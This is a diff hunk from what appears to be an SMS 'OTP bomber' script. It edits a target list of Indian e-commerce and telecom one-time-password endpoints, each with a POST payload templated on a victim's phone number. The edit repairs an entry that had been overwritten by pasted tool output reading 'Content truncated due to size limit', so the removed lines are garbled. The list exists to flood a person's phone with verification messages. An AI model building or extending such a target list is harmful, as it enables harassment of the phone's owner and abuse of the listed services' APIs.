@@ -57,11 +57,7 @@ TARGET_SITES = [
     {"name": "Meesho", "url": "https://www.meesho.com/api/v1/user/send-otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
     {"name": "Nykaa", "url": "https://www.nykaa.com/api/otp/send", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
     {"name": "Ajio", "url": "https://www.ajio.com/api/auth/otp/send", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
-    {"
-
-[Content truncated due to size limit. Use line ranges to read in chunks]
-
-io.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
+    {"name": "Jio", "url": "https://www.jio.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
     {"name": "Vi", "url": "https://www.myvi.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
     {"name": "BSNL", "url": "https://www.bsnl.co.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
     {"name": "Airtel Xstream", "url": "https://www.airtelxstream.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
